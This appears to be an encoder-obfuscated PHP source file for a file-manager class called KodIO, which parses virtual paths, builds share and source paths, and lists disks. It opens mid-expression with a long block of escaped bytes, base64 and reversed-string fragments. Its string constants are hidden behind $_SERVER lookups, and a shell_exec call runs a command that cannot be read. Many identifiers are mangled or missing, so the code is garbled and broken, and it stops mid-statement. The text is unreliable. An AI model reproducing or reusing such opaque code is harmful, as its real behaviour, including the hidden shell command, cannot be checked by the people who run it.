152\150\174\114\333\352\231\364\265\136\313\222\275\131\150\371\35\347\55\34\303\313\217\245\101\103\115\244\253\54\141\41\53".base64_decode('LA4AY8JZXE0BekhxP83emegwiiuri9DKA2k1ic8kM7Gozh9kB8ygPOvo/Hmz2hcOQg==').base64_decode('Pl8DR+hNN0F3vGI00qMU4eTuAM2AhF56cuEJLk/7jqJ7UKEWSEzaW5bv3WzcyCuiDA==').base64_decode('waZN1TBQX/QmhUo5L4gikxdGT5ASRrY592c4IquZJATz8F9ZJhpbLiP8xOJK7EdNYQ==')."\x16\x1b\xe8\xaf\xf\xcc\xdd\xb4\x29\x98\x43\x25\x1f\x54\x48\xc0\xb2\x1\x91\x9b\xc7\x7\x2\xee\xfc\xa4\x27\x30\xf4\x22\x23\x0\xbc\x39\x39\x7b\x79\x2\xac\xc7\x7d\x83\x73\xa5\xd5\x94\x50\xe6\xd1".strrev('%LU?ƒú`&#DS òF-5Gc.q[O')."\16\225\112\152\64\210\21\52\350\316\347\206\202\202\0\160\341\167\40\55\215\215\60\13\43\77\36\70\325\304\361\44\320\227\107\31\170\214\320\112\302\224\255\367\302\111\135\2\50".base64_decode('AkvtdDlXclykiz/wWMeemllvjBk8S50Gx/a2OuaIvY6QKp4CNEI2ZSmlSVrZzLfVsQ==')."\xe6\xda\x59\xd3\x24\xe5\x19\xd5\xa9\xf5\x11\x52\xb0\x4e\x43\x82\x59\x30\xc4\x88\x95\x1d\x8b\xec\x8b\xc2\x80\x5\x1e\xbe\xea\x4b\x80\x8e\x7f\x28\x6\x97\xb\x47\x9f\xc4\x7f\x8f\x39\x1a\x31\x84\xbd"."\320\226\67\313\134\203\231\121\40\166\255\65\114\305\61\74\23\74\300\325\233\210\247\342\35\370\112\217\133\156\303\141\13\220\257\265\271\201\226\74\377\240\35\212\270\350\307\34\202".base64_decode('UwgCBOa9XCkWhc4UZR3V7Yy+/hrQ+g287gBpEb+/SWYrjtwiqev2FLVCtQGsOMGjLg==')."\370\110\105\375\334\26\266\255\21\315\12\120\345\112\132\41\121\275\17\375\204\144\74\206\57\156\300\46\311\214\151\72\242\221\160\54\245\107\140\177\154\152\136\24\150\224\26\56\334"."\x9d\x67\x87\xb8\x64\x87\x8f\xd6\x68\xe\x97\x4e\xa6\x84\x76\x94\x59\x74\x49\x53\x78\x37\xf2\x16\xba\x18\x6c\x6e\x6c\x6c\xf4\x37\x36\x91\xbf\xa8\xdf\x8b\x8e\xcd\x5a\x1b\x1b\xab\xb2\x34\x36\xb6\xb2"."\xbf\x3c\x81\x9\xf\x61\x1e\xdd\x29\x84\x5e\x20\xa1\x83\xc\xe3\xa6\x9\xd\x82\x8d\xa5\x90\x2b\x56\x90\x41\xeb\xef\xa0\x86\x4a\x1a\x6d\x1a\x8c\x9e\xd4\xee\x22\x53\xc8\x3c\xff\x21\xcd\x71\x3d\xf5"."\xa5\xb1\x2b\x32\x88\x99\xde\x41\x10\x77\x8f\x80\x14\xb8\x9f\x73\xf\xae\xb8\x8f\x90\x86\x8c\xb0\x41\x81\xf6\xa\x2b\x38\x92\x4d\xa2\xde\x12\x6e\x80\xd8\x26\x1a\x15\x2e\x66\xfa\xd5\x8f\x5\x70\x70"."\x39\x50\xba\x2f\xf6\x63\x82\x5f\x7d\x42\x0\xa\xf1\xdd\x44\x4a\xd7\x5d\x4d\x23\x65\xdc\x2e\x5\x29\x84\x6c\xf4\x69\xd1\x4f\xa\x50\x64\x2e\x94\xe9\x53\xdc\x24\xd2\xa8\x2a\x44\x67\xc9\xc2\x94\x8c"."\305\362\302\332\235\106\143\242\46\376\122\5\177\43\31\306\260\6\346\147\255\161\135\156\334\64\172\202\210\261\41\245\307\57\104\303\214\142\356\107\307\25\111\270\222\135\310\251\344".strrev('*fs(`mBB"ROb3B]E+e\\39').base64_decode('k637Vk2u451YNkdlS1qxVmm9YEyZKZQWJz9DMQUhYQRwOXeH8CeoVOBN8pQJcSFzVQ==').base64_decode('AYBX52ay+Bq5KdyTmzkL7BAOUlUPgvy+W9GxsMGNu7zgxjrGlJNZoFS2Rsis2+qgEQ==')."\170\157\155\260\310\136\235\263\106\46\321\172\65\237\12\244\122\177\174\365\23\320\131\132\317\32\362\321\141\45\253\174\310\134\1\272\127\263\222\320\41\236\325\121\201\364\244\247\252"."\64\60\226\333\135\7\75\102\272\41\242\145\237\202\164\170\364\167\340\205\130\125\15\217\147\223\24\211\212\145\124\221\261\356\102\23\304\125\324\240\240\43\44\257\54\335\160\16\343"."\207\163\327\125\112\212\21\272\274\211\17\326\2\51\144\213\212\126\20\305\207\27\223\56\357\273\200\246\260\164\333\332\324\142\356\264\227\316\376\46\6\276\205\271\350\260\12\331\242"."\52\152\247\103\252\253\162\23\272\242\273\305\43\250\65\20\321\215\154\125\130\305\130\15\132\101\253\40\205\112\214\326\16\204\314\107\16\215\66\27\361\371\50\130\343\57\203\152\105".base64_decode('U9gsuydVLQCP21iEBaPOSdVCtK4+D4la4aKIoq39rLGoxaXNCjSDhtks9GzP6bG8jw==').strrev('kna.f1T"4+Uh…¥c!0&@9IB').base64_decode('pFL7cPyacNQKlJ/ksRxxdqTVE1SWkajKJKZ4Ef9xsqmuazjFSbTISpqBjTewbUybig==')."\271\322\126\216\263\236\250\127\367\214\226\120\70\32\22\125\166\136\266\357\73\270\165\243\247\155\251\263\305\202\222\0\277\164\325\331\30\70\113\342\121\122\121\365\251\321\76\250\125"."\xd4\x49\x5b\x50\x94\x2a\x63\xc0\xc0\x94\xcd\xb4\x55\x66\x72\x13\xc5\xed\x42\xd1\x49\x98\x23\x6a\x34\x6a\x9\x79\x11\xbd\x93\xab\x55\x5\xf5\x74\xa3\x90\x1d\xba\xa\x43\x69\xa7\xa2\xfa\xcd\x51\x3c"."\175\223\230\342\270\135\141\104\375\115\232\340\140\165\136\63\217\314\123\22\130\376\132\314\254\107\202\251\330\125\60\101\115\262\62\44\56\222\74\54\46\232\152\150\52\7\207\266\27".base64_decode('tALmwoT2wFbTSLXUqa7smVqEfbOqCE+jTJR0BKKm2NQjex/OYq2UGp9iScqIpoVrJA==')."\30\35\71\110\220\60\151\242\262\243\277\251\331\217\236\241\124\73\16\74\20\301\76\102\26\226\202\6\364\214\210\144\14\124\5\41\237\314\143\51\327\161\314\71\210\164\203\300\374"."\240\210\371\144\16\123\104\254\254\360\22\246\120\43\144\236\103\124\262\56\157\371\271\166\41\315\320\127\53\235\217\20\115\356\164\351\203\172\62\220\365\341\116\7\247\355\262\61\334".strrev('@XYN	9WPU>V‘å'."\r".'w@K)Yn'."\0".'TRy')."\x16\xae\xf0\xea\x65\xc3\x1c\x6a\xe1\xea\x12\xc5\xf5\x4c\xa\x3b\x44\xaa\x2a\x44\x37\x69\xa1\x5\x6a\xab\x11\x4c\x15\xc8\x69\xbb\x22\x5c\x35\xca\x55\x5a\x80\x44\xae\x71\x13\x8d\x55\x51\x64\xd4\xdb"."\xdd\x1b\x14\xa0\x76\xb1\x3c\xb9\xb4\x41\xba\x72\xea\x40\xfd\x23\x73\xc2\x84\x3\xde\x78\x21\x97\xd6\xa2\xf1\xe5\x91\x8e\x50\xb4\x33\x92\x5c\xa1\x8d\x98\x8e\x26\x55\x33\xd8\x3\xe\xee\xa5\xcc\x84"."\xa6\x7c\xe0\x11\xab\x87\xc4\x2b\x3\x34\xe8\x1f\x22\x27\x6\x7f\x46\x9c\xaa\x6c\x79\x7e\x52\x9e\xcb\x56\x9e\x61\x72\x57\xcb\xf1\xcf\x2c\x57\xd5\x58\xa4\x36\x28\xf9\xaa\x32\x54\x14\x5c\x23\x77\x5e"."\212\101\225\314\245\262\131\235\177\322\244\32\101\112\213\225\2\225\32\255\201\374\265\277\300\136\200\120\163\23\106\310\54\116\327\370\134\161\54\147\347\344\302\307\22\223\152\355\241"."\xce\x9e\x48\x4c\xf\x45\xa3\xf1\x55\x2e\x45\x3a\x29\x4\x2f\x8b\xe7\x35\x32\xea\x6b\x1c\xca\xcc\xc8\x49\xe0\x5f\xaf\xf6\x30\x6\xfe\x99\x54\xaf\xe7\x1e\x31\xa\x9f\x3e\xd5\xd9\x5c\x9\xaf\x77\xe0"."\xc9\x40\xe1\xb6\x9f\x47\x95\xa7\x73\x4a\x65\x23\x67\x9b\xa\x80\x3f\xf2\x32\x17\x4c\x3e\x8c\x7c\xde\xf5\x10\x5e\x7e\x58\x89\x56\xdc\x3b\x6b\xcd\x4f\xe9\xfc\x3\x8\x53\x1c\xdb\xd5\xca\x90\x88\x2c"."\357\116\375\257\233\232\313\110\247\122\271\14\352\226\10\13\75\356\321\277\103\175\64\21\277\131\365\74\320\147\76\64\344\223\27\142\72\163\265\203\57\232\131\354\70\4\274\72\207"."\105\342\72\223\15\353\362\23\204\73\51\117\226\324\33\311\140\46\50\206\230\7\250\357\274\60\136\203\321\210\74\230\320\354\120\33\375\34\77\256\222\123\70\225\337\341\21\6\25"."\x23\x9\x9d\x80\x71\x76\xdd\xc8\x7b\x9e\x4c\xfa\x54\xef\xfc\x55\xdf\x60\xee\xf9\x79\x5a\x3f\xed\xe\xc9\x39\x28\x3b\x47\x62\xe2\x6d\xe\x59\xd4\x9b\x52\xa3\x1\x24\x59\x93\x32\x2d\x91\x41\x6b\xd3"."\32\371\353\135\342\335\5\155\51\332\33\313\17\60\17\127\341\102\311\161\35\345\273\125\135\162\145\156\70\200\161\72\362\250\106\165\245\254\302\144\25\300\45\310\212\142\273\204\376"."\x1f\x7d\x75\xa2\x38\x6c\xa9\xe3\xc7\x8\x32\x35\xc\xe0\xaf\xec\x71\x99\x81\x8f\x1c\x1d\x4c\xa7\xfa\x89\x1e\x5e\xfc\xff\x49\x41\x9e\x98\x54\x5c\x1a\xba\x2b\xa9\x6e\x90\xed\xdd\xea\x24\xdb\x45\x5f"."\37\312\132\343\356\247\367\50\304\373\336\220\353\245\41\145\321\60\263\130\365\155\44\167\41\137\325\353\37\32\173\65\125\43\250\16\263\110\175\51\341\231\224\145\126\76\75\213\377"."\14\300\57\156\147\336\106\160\102\5\237\234\43\220\252\43\233\313\147\312\102\371\107\2\172\114\51\50\140\245\250\376\213\201\257\303\262\147\311\72\221\46\303\203\43\265\36\241\242"."\x9e\xeb\xdc\xef\xa6\xc8\xe7\x68\xe4\xde\xe9\x7e\x9e\x43\x5c\x61\xdb\x72\x31\xd8\x8e\xeb\x41\x98\x94\x95\x32\x46\x7c\x9c\x23\xa3\x54\x4d\xc6\xda\x27\xd5\xb0\xaa\x93\xca\x7a\x41\x12\x51\x98\x97\x11"."\363\175\234\222\1\337\165\313\370\330\233\143\234\324\171\137\64\121\126\232\240\237\152\351\221\274\65\144\344\23\134\147\316\145\106\122\46\247\51\23\367\0\127\66\16\12\32\245\222"."\274\103\123\267\114\362\277\313\174\17\322\372\122\335\72\63\102\327\371\75\174\122\342\234\162\373\306\201\160\23\127\51\106\370\205\206\13\132\126\316\171\252\63\120\176\347\50\15\306"."\40\73\151\147\57\277\144\204\1\123\253\304\213\137\41\22\357\122\136\21\17\126\137\24\123\155\100\240\50\352\173\364\160\215\37\120\17\142\220\101\133\252\111\324\160\55\144\212\112"."\x84\x1b\xe6\xaf\xba\x31\x4a\xa1\x32\xee\x9f\x2\x55\x5e\xdb\x81\xd7\xe3\x6a\x3d\x9e\xc3\x31\x9f\xfd\x74\x9a\xc3\xe2\x50\x43\xe3\x72\x73\x57\x1d\x69\x48\x75\x12\xef\xc3\x6e\xd5\x8f\xd4\xe1\x83\x74".base64_decode('uHTgNboaT8xN+0KdT9oGftqbPNKCzf3oMO2HYA3EuaHq6OE9dYhh9RRIeAc5ZVXLhw==')."\345\125\272\353\375\74\245\327\100\332\252\337\340\123\206\101\351\167\245\234\367\61\255\2\37\72\242\253\371\214\237\353\205\40\357\204\326\170\10\360\63\53\4\125\145\166\350\312\270"."\xa9\x5e\xeb\xd2\xa1\x32\x5e\xd3\x7a\xb3\xe5\x5c\xb8\xab\x97\x4d\x69\xdd\xc2\x9d\x7e\x56\x6d\x10\x6b\xa\x99\xe6\xf9\xb\x8f\x55\x85\x1b\x72\xa\xe5\x5d\x27\x98\xef\xc3\x1d\x2c\x70\x2b\x12\x29\x34".base64_decode('Nxpq6GlUXf0s0a09Xv1opGcH+N8tGHl64FkVne7q53WrRoDhqaLtpGyIHv0Vi6qU2A==').base64_decode('ctXxLVC+FOn+FmcfavRD2ffkYuEv/Vl5esYuUNm9UzbcB8pa5yY2EnhIy7FHsk1v2w==').strrev('S2PCZmf2/qhF++&E4')."\107\322\122\343\45\107\105\375\343\123\332\315\271\73\161\36\364\33\216\137\101\110\105\174\150\72\161\66\301\100\42\344\261\325\335\127\117\365\244\230\254\143\320\247\115\227\251\232\305".strrev('<WTMu"bVUW-7+1&BNiF|S').base64_decode('J6VCTIwEPYIFzdQYWDNDy4VxoaFoo7lFVXSolYdbLTUsp4CS/Ti6RSVfdx01SbzT8w==')."\252\57\43\121\336\247\176\161\210\30\135\220\44\117\261\121\165\235\153\304\133\147\256\163\216\355\175\375\220\160\173\252\233\143\22\365\276\21\13\264\221\231\0\360\257\51\273\253\334"._kodDe('MlE0QhS0FQ50UcsWM9R90R46kSiM7FBw+btZk8fVyPsY0w/r683m66vKm0fndMRkfsM=')."\xd3\xc0\xcb\x81\xff\x46\x96\x6f\x4a\x71\x72\xcd\xa5\xc0\x9e\x7e\xb8\x77\xd0\x19\x80\x45\xe2\x19\x6c\x25\x2e\xf4\x9c\xd1\x11\x18\xfa\x7\x33\xf0\x36\xcc\xc8\xe7\x95\x7d\xb6\xf6\x89\xa5\xea\xd1\x55"."\x82\x7c\xa3\xe2\x5\xcf\x5a\x11\xaf\xc9\x9b\xf7\x1\xd6\x7e\x7c\xaa\x9c\xbd\xad\x3a\x58\x2b\xa3\x24\x43\xe2\x60\x54\x3\x8f\x39\x8\xf9\x61\xe5\x11\xee\x5c\x7a\xb4\xc6\x55\x36\x53\xe8\x74\x3b\x89".strrev('K5P.KJ4f\'<x?;<%T-S—Ä=AkAM'."\r".'lV').strrev('o\'h^jZ[[&y&=⁄êT')."\x37\xf9\x3d\xd5\x89\xb7\x36\xdd\xb8\xee\x7a\xef\x91\x6b\x83\x90\x5\x92\xa0\x52\xe\x94\x5b\xb1\xb\x20\x76\x13\xec\xaf\x2e\xc3\xf1\x3a\x29\xf3\x4c\xb3\xb2\x6a\xaf\x6f\xd1\x28\x29\xc4\xa3\x21\x75"."\x3c\x90\x4e\xf4\x96\x2d\xc6\xb\xba\xa1\x42\xf2\xa3\xa8\xf6\x2a\xef\x5e\x57\xb1\x77\x1c\x3c\x2b\x50\xb5\x49\x21\xc9\x74\xcd\x14\x39\xfd\xc9\x8b\xc7\x9c\xc5\x9c\xcd\x63\xd1\xbe\x9e\x6\x66\xdf\x4".base64_decode('iE4OJF2WRBnl4Wm6MKUTSKrIzGSQKh+AJoeKxj6AXJJCW33Xw12S2mC4l+BxtbKlrQ==').base64_decode('sq1kE/BaeSliqpIQNY0+Guy4pki+G+B9L4DJB/iR33Xyh6tiFaRcnRL2PeN+gIQlMg==').strrev('‹ÆU?rr8C1K#2K:JÃí+nE^?Àî0').strrev('S(<dœªZrLca^z1`¬°/B')."\x53\x2c\x93\xa5\xd1\x80\x39\xee\x7d\x9a\x38\xa0\x5a\x33\xbb\x32\x56\x43\xa5\xe5\xb2\x52\x5e\x5e\xcb\xc8\x6e\x52\x58\xad\xee\xb3\x85\xe6\x2e\xae\x5a\x46\xb\xa4\x92\x20\xfe\x84\x84\x50\x6b\x50\x4e".base64_decode('UlTvQ+o78K4IgYH8pNsOW2QTc0byMLMjvwvqORtS2QyyHZ4kW31W2H0Bq0owFBQw8w==').base64_decode('UaU69XJ22gLJ2h+RWOkeYsWAXSbgDmm5Bl8hkaJjkDOhJrqa451adqyR6MuBBSYY5g==')."\151\41\167\22\317\157\172\132\257\26\360\366\214\227\260\307\163\116\72\253\234\265\252\23\253\341\345\252\101\205\17\325\156\257\267\125\70\246\336\23\250\254\244\252\75\212\206\107\312"."\xaa\x51\x86\xb7\xa8\x66\x31\x9e\x44\x4b\x4a\x9e\xd7\x55\x76\x9a\x21\xa0\x65\x79\x12\x2d\x5b\x95\x8c\x85\x15\x81\x8d\x52\xce\x31\x2a\xf6\x34\xdd\xab\x1e\x3c\x90\x62\x64\x6a\x74\xd8\x73\xd6\xe7\x59".base64_decode('pxvPmpmrPwcY583NxB61WyGlFZ6b9lqtqJl52lbI3J5doBatxZQa1JVTjmm1T6RGRg==')."\65\231\227\151\65\364\103\370\47\351\26\256\172\251\252\221\254\52\233\324\126\107\111\324\244\14\266\133\117\304\3\127\307\15\234\234\2\363\5\310\110\116\243\371\334\250\324\303\103"."\65\374\131\56\362\137\51\216\26\55\261\245\144\244\232\45\125\21\17\225\275\343\134\125\233\33\215\213\25\305\157\154\115\253\0\37\225\35\124\237\322\363\6\136\65\50\346\24\374"."\x58\x65\x39\xb9\xb4\xe9\x76\x4e\xab\x3a\xab\xe2\xe9\xf8\x91\xbc\x22\x8c\xf4\xc8\x1\xa5\x24\xc3\xa5\xc7\x50\x43\x52\xc6\x40\xc0\xf6\x49\x91\x3c\xaf\x4f\x61\x68\x24\x4e\xb8\x2c\x5f\x38\x1b\x1\x37"."\x19\xfc\x12\xb4\x83\x5e\xb6\x8b\xeb\x2f\xe6\x58\x95\x6f\xbb\x3c\x39\x69\x95\x1d\x1f\x4d\x4b\x59\x25\xf6\xdb\x6e\x39\x8e\x54\xa\xe0\xa2\x3\xc6\x2b\xd2\xbd\xd3\xa7\xe8\xbc\x90\x90\xbc\xeb\xa2\x8d".base64_decode('YpcoDG0Z9WFBuI6lZ/KkyVMZzXJF6OWMiKhbI1zLdlU8F8cSQA7AQ9YEeoiilvayPQ==')."\xf2\xfa\xc6\xf0\xf2\x83\x92\x95\x1\x54\x54\x35\x78\x98\x3f\x3\x3b\xc8\x53\x82\xf0\xf4\x81\x9f\xd5\x1\x2f\xa0\x5\xd6\x97\x46\x5c\xc5\xf9\xdb\x51\x42\xd3\xf6\xd3\x6a\x0\x11\xae\xac\x82\xfb\x3d"."\147\262\65\60\35\112\246\222\125\111\275\241\144\162\125\74\321\311\335\244\127\45\263\122\212\106\124\125\122\157\167\74\66\135\132\270\47\24\211\126\245\121\345\251\230\56\175\215\361"."\xa4\x48\x2f\x6b\x25\xbb\x81\x9c\xae\x15\x91\x8e\x15\xb2\x25\xec\xae\x5b\xde\xc\x94\xb2\x16\xa\xfc\xf1\xe6\x24\x69\xe4\x51\xe\xa0\x18\xe6\x9a\x5\xe9\x64\x4e\x96\x71\x8b\x37\xd4\x79\xb5\xd1\x1b".base64_decode('pAi43xzy6CgiwkJFVPEpBnUnSgClbuPFuhc8t7y8D7gu+RU4WxuM2Cg4p+7JDDC35g==')."\0\251\122\345\352\133\16\226\52\7\200\66\354\4\13\264\346\326\133\103\312\55\6\77\361\200\45\54\14\251\242\334\306\303\256\144\307\30\251\171\327\315\245\207\164\365\113\271\336"."\377\5\165\311\115\275\134\256\0\0".strrev('').""."", 10, -8))); goto c◊å; B: class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\162\x52\145\143\171\143\x6c\145\175"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\x46\151\x6c\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\106\x69\154\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\x70\122\x6f\157\164\x53\145\154\x66\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\123\150\x61\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\162\x65\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\111\164\x65\155\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\154\157\143\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\x52\x65\156\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\145\x72\x7d"; public static function typeList() { $ =& $_SERVER[]; return array($[1292] => self::KOD_SOURCE, $[1293] => self::KOD_USER_RECYCLE, $[1294] => self::KOD_USER_FAV, $[1295] => self::KOD_USER_FILE_TAG, $[1296] => self::KOD_USER_FILE_TYPE, $[1297] => self::KOD_GROUP_ROOT_SELF, $[1298] => self::KOD_USER_SHARE, $[1299] => self::KOD_USER_SHARE_LINK, $[1300] => self::KOD_USER_SHARE_TO_ME, $[1301] => self::KOD_SHARE_ITEM, $[1302] => self::KOD_SHARE_LINK, $[1303] => self::KOD_SEARCH, $[1304] => self::KOD_BLOCK, $[1305] => self::KOD_IO, $[1306] => self::KOD_USER_RECENT, $[1307] => self::KOD_USER_DRIVER); } public static function parse($ﬂå) { $»ì =& $_SERVER[]; $ﬂå = self::clear($ﬂå); $ = array_values(self::typeList()); preg_match($»ì[1308], $ﬂå, $ﬂ∫); $‹û = array($»ì[473] => !1, $»ì[1309] => !1, $»ì[470] => !1, $»ì[94] => $ﬂå, $»ì[1210] => !1, $»ì[1209] => $»ì[22]); if (is_array($ﬂ∫) && count($ﬂ∫) == 5) { $ﬂ© = $»ì[1310] . $ﬂ∫[2] . $»ì[380]; if (in_array($ﬂ©, $)) { $‹û[$»ì[1210]] = $ﬂ∫[1]; $‹û[$»ì[43]] = $ﬂ©; $‹û[$»ì[1311]] = substr($ﬂ©, 1, -1); $‹û[$»ì[452]] = $ﬂ∫[3]; } $‹û[$»ì[1209]] = $ﬂ∫[4]; } $ = array($»ì[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‹û[$»ì[1274]] = in_array($‹û[$»ì[43]], $); return $‹û; } public static function isTruePath($) { $ =& $_SERVER[]; if (substr($, 0, 1) != $[1310]) { return !0; } if (strpos($, $[460]) === 0) { return !0; } if (strpos($, $[1278]) === 0) { return !0; } if (strpos($, $[1312]) === 0) { return !0; } if (strpos($, $[1313]) === 0) { return !0; } if (strpos($, $[1314]) === 0) { return !0; } return !1; } public static function clear($≈º) { $ =& $_SERVER[]; $≈º = str_replace(array($[1119], $[11]), $[63], $≈º); $≈º = str_replace($[107], $[18], $≈º); $ = $[1315]; if (substr($≈º, 0, 3) == $[1316]) { $≈º = substr($≈º, 3); } while (strstr($≈º, $)) { $≈º = str_replace($, $[18], $≈º); } $≈º = preg_replace($[1317], $[18], $≈º); if ($≈º == $[18]) { return $[18]; } $≈º = rtrim($≈º, $[18]); return $≈º; } public static function pathTrue($) { $ =& $_SERVER[]; if (!$) { return $[22]; } $ = str_replace($[570], $[18], str_replace($[1318], $[18], $)); $ = str_replace($[570], $[18], str_replace($[1318], $[18], $)); if (!strstr($, $[1316])) { return $; } $“é = explode($[18], $); foreach ($“é as $≈Æ‘î => $»ä) { if ($»ä !== $[1319]) { continue; } for ($ = $≈Æ‘î; $ >= 0; $--) { if ($“é[$] === $[20] || $“é[$] === $[1319] || $“é[$] === -1) { continue; } if ($“é[$] === $[22]) { $“é[$≈Æ‘î] = -1; break; } $“é[$≈Æ‘î] = -1; $“é[$] = -1; break; } } $Ìî≠ = array(); foreach ($“é as $»ä) { if ($»ä !== -1) { $Ìî≠[] = $»ä; } } $ = implode($[18], $Ìî≠); if (strpos($, $[1320]) === 0) { $ = $[1316] . substr($, strlen($[1320])); } return $; } public static function sourceID($) { $œ• =& $_SERVER[]; $ = self::parse($); if ($[$œ•[43]] !== self::KOD_SOURCE) { show_json(LNG($œ•[1321]), !1); } return $[$œ•[452]]; } public static function make($ƒ•‹Ø) { if (!$ƒ•‹Ø) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ƒ•‹Ø)); } public static function makeShare($, $ÌÇñ) { return self::makePath(self::KOD_SHARE_ITEM, $, $ÌÇñ); } public static function makeFileTypePath($œ∂) { return self::makePath(self::KOD_USER_FILE_TYPE, $œ∂); } public static function makeFileTagPath($) { return self::makePath(self::KOD_USER_FILE_TAG, $); } public static function makePath($—º, $÷• = '', $ = '') { $ =& $_SERVER[]; $√ì€Ä = substr($—º, 1, -1); $ = $[1322] . $√ì€Ä . $[1323] . $÷• . $[1324]; $ = $ ? $ . $ . $[18] : $; return $; } public static function hashPath($√ö, $ = true) { $ =& $_SERVER[]; $€º = is_array($√ö) ? $√ö : IO::info($√ö); $ = _get($€º, $[1325], $[22]); if (!$ && isset($€º[$[229]])) { $ = trim($€º[$[229]], $[128]); } if (!$ && isset($€º[$[191]]) && $€º[$[191]]) { $€º = IO::info(KodIO::make($€º[$[191]])); $ = _get($€º, $[1325], $[22]); } $…û = md5($€º[$[94]] . $€º[$[86]] . $€º[$[95]]); if (!$ && file_exists($€º[$[94]])) { $ = Cache::get($…û . $[1326]); $ = !1; if (!$) { $ = IO::hashSimple($€º[$[94]]); Cache::set($…û . $[1326], $, 3600 * 24 * 30); } } if ($ && !$) { } return $ ? $ : $…û; } public static function hashPathSafe($¬™, $◊â = true) { $ =& $_SERVER[]; $Ÿç‰ØΩ = self::hashPath($¬™, $◊â); return md5($Ÿç‰ØΩ . $[1327] . Model($[810])->get($[811])); } public static function initSystemPath() { $ =& $_SERVER[]; if (defined($[1328])) { return; } define($[1328], self::systemPath($[189])); define($[1329], self::systemPath($[1330])); define($[1331], self::systemPath($[1332])); define($[1333], self::systemPath($[1334])); IOHistory::bindEvent(); } public static function systemPath($) { $”ö =& $_SERVER[]; $ = $”ö[1335] . ucfirst($); $œã = Model($”ö[810])->get($); if ($œã) { return $œã; } if ($ == $”ö[189]) { $œã = self::make(Model($”ö[865])->systemRootPathAdd($”ö[583])); } else { $œã = self::systemPath($”ö[189]); $ = self::sourceID($œã); $œã = self::make(Model($”ö[865])->mkdir($, $)); } Model($”ö[810])->set($, $œã); return $œã; } public static function systemFolder($∆ø) { $·•õ = IO_PATH_SYSTEM_SOURCE . $∆ø; $Îúú = Cache::get($·•õ); if (!$Îúú) { $‘É = IO::infoFullSimple($·•õ); if (!$‘É) { $Îúú = IO::mkdir($·•õ, REPEAT_SKIP); } else { $Îúú = $‘É[$_SERVER[][94]]; } Cache::set($·•õ, $Îúú, 3600 * 10); } return $Îúú; } public static function defaultDriver() { return Model($_SERVER[][807])->defaultDriver(); } public static function defaultIO() { $ ∏ﬁß =& $_SERVER[]; $ = self::defaultDriver(); return $ ∏ﬁß[1336] . $[$ ∏ﬁß[452]] . $ ∏ﬁß[1324]; } public static function defaultDriverInit() { static $‘© = false; if ($‘©) { return $‘©; } $‘© = IO::init(self::defaultIO()); return $‘©; } public static function fileTypeList() { $›π =& $_SERVER[]; $¬°÷ø = $GLOBALS[$›π[16]][$›π[1337]]; foreach ($¬°÷ø as $ => $»≠‹ß) { $∆æ = $›π[1338] . $; $“ã = LNG($∆æ); if ($∆æ != $“ã) { $¬°÷ø[$][$›π[42]] = $“ã; } } return $¬°÷ø; } public static function diskList($ ∫ = true) { $ = $_SERVER[][1339]; if ($ ∫) { $ = Cache::get($); if (is_array($)) { return $; } } $ = self::diskListGet(); Cache::set($, $, 60); return $; } public static function diskListGet() { $ËñÖœ∏ =& $_SERVER[]; $»ï = array(); if ($GLOBALS[$ËñÖœ∏[16]][$ËñÖœ∏[1340]] == $ËñÖœ∏[1341]) { $ = $ËñÖœ∏[1342]; for ($À© = 0; $À© < strlen($); $À©++) { $»Ä÷† = $[$À©] . $ËñÖœ∏[1343]; if (file_exists($»Ä÷†)) { $»ï[] = $»Ä÷†; } } return $»ï; } if (!function_exists($ËñÖœ∏[108])) { $»ï[] = $ËñÖœ∏[876]; return $»ï; } $ = explode($ËñÖœ∏[11], shell_exec($ËñÖœ∏[1344])); array_shift($); array_pop($); $“Ö = array($ËñÖœ∏[1345], $ËñÖœ∏[1346], $ËñÖœ∏[1347], $ËñÖœ∏[1348], $ËñÖœ∏[1349], $ËñÖœ∏[1350], $ËñÖœ∏[1351], $ËñÖœ∏[1352]); foreach ($ as $«£) { $Õç = preg_split($ËñÖœ∏[1353], $«£); $»Ä÷† = $Õç[count($Õç) - 1]; if (!strstr($Õç[0], $ËñÖœ∏[1354]) || !$»Ä÷†) { continue; } $Œ• = rtrim($»Ä÷†, $ËñÖœ∏[18]) . $ËñÖœ∏[18]; if (in_array($Œ•, $“Ö)) { continue; } $»ï[] = $Œ•; } return $»ï; } public static function isSameDisk($Ëµò, $Ï¨ò) { $ =& $_SERVER[]; if ($GLOBALS[$[16]][$[1340]] == $[1341]) { return strtolower(substr($Ëµò, 0, 1)) == strtolower(substr($Ï¨ò, 0, 1)); } $ = self::diskList(); $„´Ä = !1; $Ÿ™ƒü = !1; sort($); $ = array_reverse($); $Ëµò = rtrim($Ëµò, $[18]) . $[18]; $Ï¨ò = rtrim($Ï¨ò, $[18]) . $[18]; foreach ($ as $≈†) { $Î®û = strlen($≈†); if (!$„´Ä && substr($Ëµò, 0, $Î®û) == $≈†) { $„´Ä = $≈†; } if (!$Ÿ™ƒü && substr($Ï¨ò, 0, $Î®û) == $≈†) { $Ÿ™ƒü = $≈†; } if ($„´Ä && $Ÿ™ƒü) { break; } } return $„´Ä === $Ÿ™ƒü; } public static function transferType($, $) { $Èá† =& $_SERVER[]; $Ÿé = self::driverType($); $”±‘¨ = self::driverType($); if ($Ÿé[$Èá†[43]] == 